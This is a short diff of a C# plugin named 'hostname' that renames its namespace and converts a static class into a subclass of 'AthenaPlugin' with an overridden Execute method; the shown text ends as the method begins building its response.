@@ -1,11 +1,12 @@
 ﻿using PluginBase;
+using System;
 using System.Collections.Generic;
 using System.Net;
-namespace Plugin
+namespace Plugins
 {
-    public static class hostname
+    public class Plugin : AthenaPlugin
     {
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             PluginHandler.AddResponse(new ResponseResult
             {
